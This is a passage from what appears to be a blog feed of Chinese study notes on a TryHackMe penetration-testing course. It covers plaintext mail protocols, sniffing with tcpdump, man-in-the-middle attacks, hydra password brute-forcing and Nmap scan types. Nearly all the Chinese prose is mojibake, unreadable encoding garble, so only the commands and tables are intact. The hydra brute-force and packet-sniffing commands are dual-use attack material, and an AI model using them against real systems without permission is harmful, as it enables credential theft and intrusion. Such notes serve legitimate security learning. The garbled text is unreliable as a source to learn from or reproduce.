è¾“åè®®SMTPç”¨äºå’ŒMTAæœåŠ¡å™¨è¿›è¡Œä¸€ä¸ªé€šä¿¡ï¼ŒSMTPä½¿ç”¨çš„æ˜¯æ˜æ–‡ï¼Œå¯ä»¥ä½¿ç”¨telnetå®¢æˆ·ç«¯è¿æ¥åˆ°SMTPæœåŠ¡å™¨ç«¯ï¼Œå¹¶å……å½“å‘é€æ¶ˆæ¯çš„ç”µå­é‚®ä»¶å®¢æˆ·ç«¯(MUA)ã€‚</p><p>SMTPç›‘å¬25ç«¯å£ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131123511.png" alt="image-20240713112351327"></p><h2 id="IMAP-äº’è”ç½‘æ¶ˆæ¯è®¿é—®åè®®"><a href="#IMAP-äº’è”ç½‘æ¶ˆæ¯è®¿é—®åè®®" class="headerlink" title="IMAP(äº’è”ç½‘æ¶ˆæ¯è®¿é—®åè®®)"></a>IMAP(äº’è”ç½‘æ¶ˆæ¯è®¿é—®åè®®)</h2><p>ä½¿ç”¨çš„é»˜è®¤ç›‘å¬ç«¯å£æ˜¯<strong>143</strong></p><p>imapæ¯”pop3æ›´å¤æ‚ä¸€äº›ï¼Œå®ƒå¯ä»¥è®©ç”µå­é‚®ä»¶åœ¨å¤šä¸ªè®¾å¤‡ï¼ˆå’Œé‚®ä»¶å®¢æˆ·ç«¯ï¼‰ä¹‹é—´ä¿æŒåŒæ­¥ã€‚ç®€å•æ¥è®²å°±æ˜¯ï¼Œä½ åœ¨æ‰‹æœºä¸Šå·²ç»è¯»è¿‡äº†è¿™ä¸ªé‚®ä»¶ï¼Œé‚£ä¹ˆåœ¨ç”µè„‘ä¸Šè¿™ä¸ªé‚®ä»¶å°†ä¸ä¼šæ˜¾ç¤ºæœªè¯»ã€‚</p><p>imapåŒæ ·éœ€è¦è¿›è¡Œèº«ä»½çš„ä¸€ä¸ªéªŒè¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407131146786.png" alt="image-20240713114643588"></p><p>imapè¦æ±‚æ¯ä¸ªå‘½ä»¤å‰é¢éƒ½è¦æœ‰ä¸€ä¸ªéšæœºå­—ç¬¦ï¼Œæ‰€ä»¥fsrm fsrm1 fsrm3 æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„ã€‚<code>list &quot;&quot; &quot;*&quot;</code>æ˜¯åˆ—å‡ºé‚®ä»¶æ–‡ä»¶å¤¹ã€‚ <code>EXAMINE INBOX</code>æ˜¯æŸ¥çœ‹é‚®ä»¶ç®±ä¸­æ˜¯å¦æœ‰æ–°çš„é‚®ä»¶ã€‚</p><table><thead><tr><th>Protocol</th><th>TCP Port</th><th>Application(s)</th><th>Data Security</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>File Transfer</td><td>æ˜æ–‡ï¼ˆæ˜æ–‡ï¼‰</td></tr><tr><td>HTTP</td><td>80</td><td>Worldwide Web</td><td>æ˜æ–‡</td></tr><tr><td>IMAP</td><td>143</td><td>Email (MDA)</td><td>æ˜æ–‡</td></tr><tr><td>POP3</td><td>110</td><td>Email (MDA)</td><td>æ˜æ–‡</td></tr><tr><td>SMTP</td><td>25</td><td>Email (MTA)</td><td>æ˜æ–‡</td></tr><tr><td>Telnet</td><td>23</td><td>Remote Access</td><td>æ˜æ–‡</td></tr></tbody></table><h1 id="æ˜“é­å—çš„æ”»å‡»"><a href="#æ˜“é­å—çš„æ”»å‡»" class="headerlink" title="æ˜“é­å—çš„æ”»å‡»"></a>æ˜“é­å—çš„æ”»å‡»</h1><h2 id="1-å—…æ¢æ”»å‡»-ç½‘ç»œæ•°æ®åŒ…æ•è·"><a href="#1-å—…æ¢æ”»å‡»-ç½‘ç»œæ•°æ®åŒ…æ•è·" class="headerlink" title="1.å—…æ¢æ”»å‡»(ç½‘ç»œæ•°æ®åŒ…æ•è·)"></a>1.å—…æ¢æ”»å‡»(ç½‘ç»œæ•°æ®åŒ…æ•è·)</h2><p>å½“åè®®ä»¥æ˜æ–‡çš„æ–¹å¼è¿›è¡Œä¼ è¾“æ—¶ï¼Œç¬¬ä¸‰æ–¹å¯ä»¥å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œä¸€ä¸ªåˆ†æï¼Œä»è€Œå¯ä»¥è·å–åˆ°ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯ã€‚</p><p>åªè¦ç”¨æˆ·å…·æœ‰é€‚å½“çš„æƒé™ï¼ˆ Linuxä¸Šçš„ root æƒé™å’Œ MS Windows ä¸Šçš„ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨ä»¥å¤ªç½‘ (802.3) ç½‘å¡è¿›è¡Œå—…æ¢æ”»å‡»ã€‚æœ‰è®¸å¤šç¨‹åºå¯ç”¨äºæ•è·ç½‘ç»œæ•°æ®åŒ…ã€‚</p><p>1.Wiresharkæ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æºå›¾å½¢ç”¨æˆ·ç•Œé¢ (GUI) ç¨‹åºï¼Œé€‚ç”¨äºå¤šç§æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬Linuxã€macOS å’Œ MS Windowsã€‚</p><p>2.Tcpdumpæ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æºå‘½ä»¤è¡Œç•Œé¢ ( CLI ) ç¨‹åºï¼Œå·²è¢«ç§»æ¤åˆ°è®¸å¤šæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œã€‚</p><p>3.Tsharkæ˜¯Wireshark çš„CLIæ›¿ä»£å“ã€‚</p><p>ä½¿ç”¨Tcpdumpå¯¹æ•°æ®è¿›è¡Œè·å–ï¼š</p><p>å‘½ä»¤å¦‚ä¸‹ï¼š<code>sudo Tcpdump port xxx -A</code> </p><p>è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ï¼ŒAç”¨æˆ·ä½¿ç”¨pop3è¿›è¡Œé‚®ä»¶çš„æ£€æŸ¥ï¼Œæ­¤æ—¶çš„pop3ç›‘å¬ç«¯å£æ˜¯110ï¼Œé‚£ä¹ˆ</p><p><code>sudo Tcpdump port 110 -A</code>  </p><p>-Aæ˜¯ä»¥asciiç çš„å½¢å¼æ˜¾ç¤ºæ•è·çš„æ•°æ®åŒ…ã€‚</p><p>æˆ–è€…ä½¿ç”¨Wiresharkè¿›è¡Œæµé‡åˆ†æã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c1ec79277c1f02beeb20f7dc81df2fd3.png" alt="img"></p><p>é˜²å¾¡æ–¹æ³•å°±æ˜¯å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡Œä¸€ä¸ªåŠ å¯†ï¼Œä¸ç”¨æ˜æ–‡è¿›è¡Œä¼ è¾“ã€‚å¯¹äºè¿œç¨‹è®¿é—®ï¼Œtelnetç”¨sshè¿›è¡Œä»£æ›¿ã€‚</p><h2 id="2-ä¸­é—´äººæ”»å‡»-MITM"><a href="#2-ä¸­é—´äººæ”»å‡»-MITM" class="headerlink" title="2.ä¸­é—´äººæ”»å‡»(MITM)"></a>2.ä¸­é—´äººæ”»å‡»(MITM)</h2><p>å‡è®¾æœ‰A,Bä¸¤ä¸ªç”¨æˆ· ä¸­é—´äººæ˜¯C</p><p>Aç”¨æˆ·å‘Bç”¨æˆ·å‘é€ä¿¡æ¯ï¼Œä½†è¿™ä¸ªä¿¡æ¯è¢«Cç»™åŠ«æŒäº†ï¼ŒCå†å‘Šè¯‰Bä¿®æ”¹åçš„ä¿¡æ¯ï¼ŒBåšå‡ºååº”ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3cb0c4f9dde184bf8dcd6b3a45418a44.png" alt="img"></p><p>é˜²å¾¡æªæ–½ï¼š</p><p>1.ä½¿ç”¨é€‚å½“çš„èº«ä»½éªŒè¯ã€‚</p><p>2.å¯¹ä¼ è¾“çš„ä¿¡æ¯è¿›è¡Œä¸€ä¸ªåŠ å¯†æˆ–è€…ç­¾åã€‚</p><p>ä¼ è¾“å±‚å®‰å…¨æ€§(TLS) å¯é˜²æ­¢è¿™ä¸ªæ”»å‡»ã€‚</p><p>è®¸å¤šå·¥å…·å¯ä»¥å¸®åŠ©ä½ å®æ–½æ­¤ç±»æ”»å‡»ï¼Œä¾‹å¦‚<a href="https://www.ettercap-project.org/">Ettercap</a>å’Œ<a href="https://www.bettercap.org/">Bettercap</a></p><h2 id="3-å¯†ç æ”»å‡»-èº«ä»½éªŒè¯æ”»å‡»"><a href="#3-å¯†ç æ”»å‡»-èº«ä»½éªŒè¯æ”»å‡»" class="headerlink" title="3.å¯†ç æ”»å‡»(èº«ä»½éªŒè¯æ”»å‡»)"></a>3.å¯†ç æ”»å‡»(èº«ä»½éªŒè¯æ”»å‡»)</h2><p>å…³äºå¯†ç æ”»å‡»å¤§è‡´æœ‰ä¸‰ç±»ï¼š</p><p>1.è¿›è¡ŒçŒœæµ‹ï¼Œæœ‰äº›äººä¼šå°†å¯†ç è®¾ç½®æˆå® ç‰©çš„åå­—æˆ–è€…å‡ºç”Ÿæ—¥æœŸç­‰ã€‚</p><p>2.å­—å…¸æ”»å‡»ï¼Œæ‹“å±•äº†å¯†ç çŒœæµ‹ï¼Œå°†æ‰€æœ‰å¯èƒ½çš„ç»“æœæ”¾åœ¨ä¸€ä¸ªå­—å…¸ä¸­ã€‚</p><p>3.æš´åŠ›ç ´è§£ï¼šè¿™ç§æ”»å‡»æ˜¯æœ€å½»åº•ã€æœ€è€—æ—¶çš„æ”»å‡»ï¼Œæ”»å‡»è€…ä¼šå°è¯•æ‰€æœ‰å¯èƒ½çš„å­—ç¬¦ç»„åˆï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»ä¼šå¿«é€Ÿå¢é•¿ã€‚</p><p><code>hydra</code>æ˜¯ä¸€ä¸ªä¸é”™çš„æš´åŠ›ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ï¼ˆpop3,http,ssh,ftp,smtp,imapç­‰ï¼‰</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ä½¿ç”¨å‘½ä»¤ï¼š<br><span class="hljs-symbol">hydra</span> -l username -P xxx.txt <span class="hljs-built_in">ip</span> service <span class="hljs-comment">//xxx.txtä¸ºå¯†ç å­—å…¸  serviceä¸ºä¸åŒçš„æœåŠ¡</span><br>æœ‰äº›æƒ…å†µä¸‹ï¼Œæ‰«æå‡ºæ¥çš„æœåŠ¡å¹¶ä¸æ˜¯é»˜è®¤ç«¯å£ï¼Œä¾‹å¦‚pop3æœåŠ¡æ‰«æå‡ºæ¥çš„ç«¯å£ä¿¡æ¯æ˜¯<span class="hljs-number">55007</span> hydra -l username -P xxx.txt -s PORT <span class="hljs-built_in">ip</span> service<br>-V æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯<br>-d è¿›è¡Œè°ƒè¯•<br>-t n è®¾ç½®çº¿ç¨‹ å¦‚æœä¸è®¾ç½®çš„è¯é»˜è®¤æ˜¯<span class="hljs-number">16</span> <br></code></pre></td></tr></table></figure><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><h2 id="ä¼ è¾“å±‚å®‰å…¨æ€§-TLS"><a href="#ä¼ è¾“å±‚å®‰å…¨æ€§-TLS" class="headerlink" title="ä¼ è¾“å±‚å®‰å…¨æ€§ (TLS)"></a>ä¼ è¾“å±‚å®‰å…¨æ€§ (TLS)</h2><p>å¯ä»¥é˜²æ­¢å¯†ç å—…æ¢å’Œä¸­é—´äººæ”»å‡»ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9d265987c58331f6fd2f664837f85380.png" alt="img"></p><h1 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h1><table><thead><tr><th>Protocol</th><th>TCP Port</th><th>Application(s)</th><th>Data Security</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>File Transfer</td><td>æ˜æ–‡</td></tr><tr><td>FTPS</td><td>990</td><td>File Transfer</td><td>å¯†æ–‡</td></tr><tr><td>HTTP</td><td>80</td><td>Worldwide Web</td><td>æ˜æ–‡</td></tr><tr><td>HTTPS</td><td>443</td><td>Worldwide Web</td><td>å¯†æ–‡</td></tr><tr><td>IMAP</td><td>143</td><td>Email (MDA)</td><td>æ˜æ–‡</td></tr><tr><td>IMAPS</td><td>993</td><td>Email (MDA)</td><td>å¯†æ–‡</td></tr><tr><td>POP3</td><td>110</td><td>Email (MDA)</td><td>æ˜æ–‡</td></tr><tr><td>POP3S</td><td>995</td><td>Email (MDA)</td><td>å¯†æ–‡</td></tr><tr><td>SFTP</td><td>22</td><td>File Transfer</td><td>å¯†æ–‡</td></tr><tr><td>SSH</td><td>22</td><td>Remote Access and File Transfer</td><td>å¯†æ–‡</td></tr><tr><td>SMTP</td><td>25</td><td>Email (MTA)</td><td>æ˜æ–‡</td></tr><tr><td>SMTPS</td><td>465</td><td>Email (MTA)</td><td>å¯†æ–‡</td></tr><tr><td>Telnet</td><td>23</td><td>Remote Access</td><td>æ˜æ–‡</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmapç«¯å£æ‰«æ</title>
    <link href="/2024/07/12/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2024/07/12/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmapç«¯å£æ‰«æ"><a href="#Nmapç«¯å£æ‰«æ" class="headerlink" title="Nmapç«¯å£æ‰«æ"></a>Nmapç«¯å£æ‰«æ</h1><h2 id="æœåŠ¡æ£€æµ‹"><a href="#æœåŠ¡æ£€æµ‹" class="headerlink" title="æœåŠ¡æ£€æµ‹"></a>æœåŠ¡æ£€æµ‹</h2><p><code>nmap -sV ip</code> æ£€æµ‹è¿è¡Œç«¯å£å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p><code>--version-intensity LEVEL</code>çº§åˆ«èŒƒå›´åœ¨ 0ï¼ˆæœ€è½»ï¼‰å’Œ 9ï¼ˆæœ€å®Œæ•´ï¼‰ä¹‹é—´æ¥æ§åˆ¶å¼ºåº¦ã€‚<code>-sV --version-light</code>å¼ºåº¦ä¸º 2ï¼Œè€Œ <code>-sV --version-all</code>å¼ºåº¦ä¸º 9ã€‚</p><h2 id="æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œè·Ÿè¸ªè·¯ç”±"><a href="#æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œè·Ÿè¸ªè·¯ç”±" class="headerlink" title="æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œè·Ÿè¸ªè·¯ç”±"></a>æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œè·Ÿè¸ªè·¯ç”±</h2><p>æ“ä½œç³»ç»Ÿçš„æ£€æµ‹ï¼š</p><p><code>nmap -O ip</code>  æ£€æµ‹æ“çºµç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚æœ‰çš„æ—¶å€™ä¼šä¸å‡†ç¡®ï¼Œéœ€è¦è°¨æ…å¯¹å¾…ã€‚</p><p>è¿½è¸ªè·¯ç”±ï¼š</p><p><code>nmap --traceroute ip</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407121855012.png" alt="image-20240712185456798"></p><h2 id="Nmap-è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰"><a href="#Nmap-è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰" class="headerlink" title="Nmap è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰"></a>Nmap è„šæœ¬å¼•æ“ï¼ˆNSEï¼‰</h2><p>Nmapä½¿ç”¨ Lua è¯­è¨€æä¾›å¯¹è„šæœ¬çš„æ”¯æŒã€‚ä½œä¸ºNmapçš„ä¸€éƒ¨åˆ†ï¼ŒNmap è„šæœ¬å¼•æ“ (NSE) æ˜¯ä¸€ä¸ª Lua è§£é‡Šå™¨ï¼Œå…è®¸Nmapæ‰§è¡Œç”¨ Lua è¯­è¨€ç¼–å†™çš„Nmapè„šæœ¬ã€‚</p><table><thead><tr><th>è„šæœ¬ç±»åˆ«</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>auth</code></td><td>è®¤è¯ç›¸å…³è„šæœ¬</td></tr><tr><td><code>broadcast</code></td><td>é€šè¿‡å‘é€å¹¿æ’­æ¶ˆæ¯å‘ç°ä¸»æœº</td></tr><tr><td><code>brute</code></td><td>å¯¹ç™»å½•è¿›è¡Œæš´åŠ›å¯†ç å®¡è®¡</td></tr><tr><td><code>default</code></td><td>é»˜è®¤è„šæœ¬ï¼Œä¸<code>-sC</code>ç±»ä¼¼</td></tr><tr><td><code>discovery</code></td><td>æ£€ç´¢å¯è®¿é—®çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“è¡¨å’ŒDNSåç§°</td></tr><tr><td><code>dos</code></td><td>æ£€æµ‹æ˜“å—æ‹’ç»æœåŠ¡ ( DoS )æ”»å‡»çš„æœåŠ¡å™¨</td></tr><tr><td><code>exploit</code></td><td>å°è¯•åˆ©ç”¨å„ç§æ˜“å—æ”»å‡»çš„æœåŠ¡</td></tr><tr><td><code>external</code></td><td>ä½¿ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡æ£€æŸ¥ï¼Œä¾‹å¦‚ Geoplugin å’Œ Virustotal</td></tr><tr><td><code>fuzzer</code></td><td>å‘èµ·æ¨¡ç³Šæµ‹è¯•æ”»å‡»</td></tr><tr><td><code>intrusive</code></td><td>ä¾µå…¥æ€§è„šæœ¬ï¼Œä¾‹å¦‚æš´åŠ›æ”»å‡»å’Œæ¼æ´åˆ©ç”¨</td></tr><tr><td><code>malware</code></td><td>æ‰«æåé—¨</td></tr><tr><td><code>safe</code></td><td>ä¸ä¼šä½¿ç›®æ ‡å´©æºƒçš„å®‰å…¨è„šæœ¬</td></tr><tr><td><code>version</code></td><td>æ£€ç´¢æœåŠ¡ç‰ˆæœ¬</td></tr><tr><td><code>vuln</code></td><td>æ£€æŸ¥æ¼æ´æˆ–åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡</td></tr></tbody></table><p>â€“script â€œSCRIPT-NAMEâ€  æŒ‡å®šè„šæœ¬åå­— </p><p>ä¾‹å¦‚ï¼šâ€“script â€œsafeâ€</p><h2 id="ä¿å­˜è¾“å‡º"><a href="#ä¿å­˜è¾“å‡º" class="headerlink" title="ä¿å­˜è¾“å‡º"></a>ä¿å­˜è¾“å‡º</h2><p>åˆ†ä¸ºä¸‰ç±»ï¼š</p><h3 id="1-Normal"><a href="#1-Normal" class="headerlink" title="1.Normal"></a>1.Normal</h3><p><code>-oN filename</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122054557.png" alt="image-20240712205431353"></p><h3 id="2-Grepable-grepable"><a href="#2-Grepable-grepable" class="headerlink" title="2.Grepable (grepable)"></a>2.Grepable (<code>grep</code>able)</h3><p><code>-oG filename</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122100450.png" alt="image-20240712210010271"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122100673.png" alt="image-20240712210036526"></p><h3 id="3-XML"><a href="#3-XML" class="headerlink" title="3.XML"></a>3.XML</h3><p><code>-oX filename</code></p><p>ç»“åˆæ‰€æœ‰çš„ï¼š<br><code>-oA filename -oN -oG -oX</code></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap é«˜çº§ç«¯å£æ‰«æ</title>
    <link href="/2024/07/10/Nmap%20%E9%AB%98%E7%BA%A7%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2024/07/10/Nmap%20%E9%AB%98%E7%BA%A7%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-é«˜çº§ç«¯å£æ‰«æ"><a href="#Nmap-é«˜çº§ç«¯å£æ‰«æ" class="headerlink" title="Nmap é«˜çº§ç«¯å£æ‰«æ"></a>Nmap é«˜çº§ç«¯å£æ‰«æ</h1><p>tcpæ•°æ®åŒ…çš„ç›¸å…³æ ‡å¿—ï¼š</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23540a5fcd27454892a73ac051d29664.png" alt="img"></p><h2 id="TCP-Null-Scan-FIN-Scan-and-Xmas-Scan"><a href="#TCP-Null-Scan-FIN-Scan-and-Xmas-Scan" class="headerlink" title="TCP Null Scan, FIN Scan, and Xmas Scan"></a>TCP Null Scan, FIN Scan, and Xmas Scan</h2><h3 id="NUll-Scan-ç©ºæ‰«æ"><a href="#NUll-Scan-ç©ºæ‰«æ" class="headerlink" title="NUll Scan(ç©ºæ‰«æ)"></a>NUll Scan(ç©ºæ‰«æ)</h3><p>ç©ºæ‰«æï¼š-sN æ²¡æœ‰è®¾ç½®æ ‡å¿—çš„TCPæ•°æ®åŒ…ï¼Œå½“è¿™ä¸ªæ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡æœåŠ¡æ—¶ï¼Œå¦‚æœç«¯å£å¼€æ”¾å°±æ²¡æœ‰è¿”å›ç»“æœï¼Œæˆ–è€…æ˜¯è¢«é˜²ç«å¢™é˜»æŒ¡äº†ä¹Ÿæ²¡æœ‰è¿”å›ç»“æœã€‚</p><p>ä½†è¿™ä¸ªæœ‰ä¸€ä¸ªç¼ºé™·å°±æ˜¯ï¼Œæ²¡æœ‰è¿”å›çš„æ•°æ®åŒ…ï¼Œå¯èƒ½æ˜¯è¢«é˜²ç«å¢™ç»™é˜»æŒ¡äº†ï¼Œå¹¶ä¸èƒ½è¿›è¡Œä¸€ä¸ªå…¨é¢çš„åˆ¤æ–­ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/04b178a9cf7048c21256988b8b2343e3.png" alt="img"></p><p>å¦‚æœæ²¡æœ‰è®¾ç½®æ ‡å¿—çš„tcpæ•°æ®åŒ…å‘é€åˆ°ç«¯å£å…³é—­çš„æœåŠ¡ä¸Šæ—¶ï¼Œä¼šè¿”å›RST,ACKæ•°æ®åŒ…ã€‚</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/224e01a913a1ce7b0fb2b9290ff5e1c8.png" alt="img"></p><h3 id="FIN-Scan"><a href="#FIN-Scan" class="headerlink" title="FIN Scan"></a>FIN Scan</h3><p>FIN SCANï¼š-sF</p><p>è·Ÿç©ºæ‰«æä¸åŒçš„æ˜¯ï¼ŒFINæ‰«ææ˜¯å‘é€å¸¦æœ‰FINæ ‡å¿—çš„tcpæ•°æ®åŒ…ï¼Œå¦‚æœç«¯å£å¼€æ”¾æˆ–è€…è¢«é˜²ç«å¢™é˜»æŒ¡ï¼Œä¸è¿”å›ç»“æœã€‚</p><p>å¦‚æœç«¯å£å…³é—­çš„è¯ï¼Œå°±ä¼šè¿”å›RST,ACKæ•°æ®åŒ…ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›é˜²ç«å¢™ä¼šå·å·çš„ä¸¢å¼ƒæµé‡ï¼Œè€Œä¸è¿”å›RST,ACKã€‚</p><h3 id="Xmas-Scan"><a href="#Xmas-Scan" class="headerlink" title="Xmas Scan"></a>Xmas Scan</h3><p>Xmas Scan: -sX</p><p>å¸¦æœ‰FINã€PSH å’Œ URG æ ‡å¿—çš„tcpæ•°æ®åŒ…ã€‚</p><p>è·Ÿä¸Šé¢çš„æƒ…å†µä¸€æ ·ï¼Œå¦‚æœæ”¶åˆ°äº†RSTæ•°æ®è¿”å›ï¼Œè¯´æ˜ç«¯å£å…³é—­ã€‚</p><p>è¿™ä¸‰ç§æ‰«æç±»å‹æœ€æœ‰æ•ˆçš„ä¸€ç§æƒ…å†µæ˜¯æ‰«æ<strong>æ— çŠ¶æ€ï¼ˆéçŠ¶æ€ï¼‰é˜²ç«å¢™</strong>åé¢çš„ç›®æ ‡ã€‚æ— çŠ¶æ€é˜²ç«å¢™å°†æ£€æŸ¥ä¼ å…¥æ•°æ®åŒ…æ˜¯å¦è®¾ç½®äº† <strong>SYN æ ‡å¿—</strong>ä»¥æ£€æµ‹è¿æ¥å°è¯•ã€‚ä½¿ç”¨ä¸ SYN æ•°æ®åŒ…<strong>ä¸åŒ¹é…</strong>çš„æ ‡å¿—ç»„åˆå¯ä»¥æ¬ºéª—é˜²ç«å¢™å¹¶åˆ°è¾¾å…¶åé¢çš„ç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œ<strong>æœ‰çŠ¶æ€é˜²ç«å¢™</strong>å®é™…ä¸Šä¼šé˜»æ­¢æ‰€æœ‰æ­¤ç±»ç²¾å¿ƒè®¾è®¡çš„æ•°æ®åŒ…å¹¶ä½¿è¿™ç§æ‰«æå˜å¾—æ¯«æ— ç”¨å¤„ã€‚</p><h2 id="TCP-Maimon-æ‰«æ"><a href="#TCP-Maimon-æ‰«æ" class="headerlink" title="TCP Maimon æ‰«æ"></a>TCP Maimon æ‰«æ</h2><p>TCP Maimon æ‰«æ: -sM</p><p>tcpæ•°æ®åŒ…è®¾ç½®äº†FINå’ŒACKã€‚ç›®æ ‡ç³»ç»Ÿä¼šå‘é€RSTæ¥ä½œä¸ºå“åº”ï¼Œæ— è®ºTCPç«¯å£æ˜¯å¦æ‰“å¼€ï¼Œå¤§å¤šæ•°ç›®æ ‡ç³»ç»Ÿéƒ½ä¼šä»¥ RST æ•°æ®åŒ…è¿›è¡Œå“åº”ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æ— æ³•å‘ç°æ‰“å¼€çš„ç«¯å£ã€‚æ­¤æ‰«æä¸é€‚ç”¨äºç°ä»£ç½‘ç»œä¸­é‡åˆ°çš„å¤§å¤šæ•°ç›®æ ‡ã€‚</p><h2 id="TCP-ACK-Window-and-Custom-Scan"><a href="#TCP-ACK-Window-and-Custom-Scan" class="headerlink" title="TCP ACK, Window, and Custom Scan"></a>TCP ACK, Window, and Custom Scan</h2><h3 id="TCP-ACKæ‰«æ"><a href="#TCP-ACKæ‰«æ" class="headerlink" title="TCP ACKæ‰«æ"></a>TCP ACKæ‰«æ</h3><p>å‘ç›®æ ‡æœåŠ¡å™¨å‘é€ä¸€ä¸ªå¸¦æœ‰ACKæ ‡å¿—çš„TCPæ•°æ®åŒ…ã€‚</p><p>TCP ACKæ‰«æï¼š-sA</p><p>æ— è®ºç«¯å£çŠ¶æ€å¦‚ä½•ï¼Œç›®æ ‡éƒ½ä¼šä½¿ç”¨ RST å“åº” ACKã€‚æ­¤æ‰«æä¸ä¼šå‘Šè¯‰æˆ‘ä»¬ç›®æ ‡ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚</p><p>åœ¨ç›®æ ‡æœåŠ¡å™¨å®‰è£…é˜²ç«å¢™ä¹‹å‰ï¼Œæ²¡ä»€ä¹ˆå¤ªå¤§çš„ç”¨å¤„ï¼Œæ˜¾ç¤ºä¸äº†ç«¯å£çš„ä¿¡æ¯ã€‚ä½†åœ¨ç›®æ ‡æœåŠ¡å™¨å®‰è£…é˜²ç«å¢™ä¹‹åï¼Œç”¨å¤„å°±å¤§å¤§æé«˜äº†ï¼Œå‘é€å¸¦æœ‰ACKæ ‡å¿—çš„æ•°æ®åŒ…ï¼Œæ²¡æœ‰è¿”å›ç»“æœçš„ï¼Œå°±æ˜¯è¢«é˜²ç«å¢™ç»™é˜»æŒ¡äº†ï¼Œä½†è¿”å›RSTæ•°æ®åŒ…çš„ï¼Œå°±æ˜¯é˜²ç«å¢™æ²¡æœ‰é˜»æŒ¡çš„ã€‚è¿™ç§ç±»å‹çš„æ‰«ææ›´é€‚åˆå‘ç°é˜²ç«å¢™è§„åˆ™é›†å’Œé…ç½®ã€‚</p><h3 id="TCP-Windowæ‰«æ"><a href="#TCP-Windowæ‰«æ" class="headerlink" title="TCP Windowæ‰«æ"></a>TCP Windowæ‰«æ</h3><p>TCP Windowæ‰«æï¼š-sW</p><p>TCPçª—å£æ‰«æä¸ ACK æ‰«æå‡ ä¹ç›¸åŒï¼›ä½†æ˜¯ï¼Œå®ƒä¼šæ£€æŸ¥è¿”å›çš„ RST æ•°æ®åŒ…çš„TCPçª—å£å­—æ®µã€‚</p><h3 id="TCP-Customæ‰«æ"><a href="#TCP-Customæ‰«æ" class="headerlink" title="TCP Customæ‰«æ"></a>TCP Customæ‰«æ</h3><p>è¿™ä¸ªæ˜¯è‡ªå®šä¹‰æ 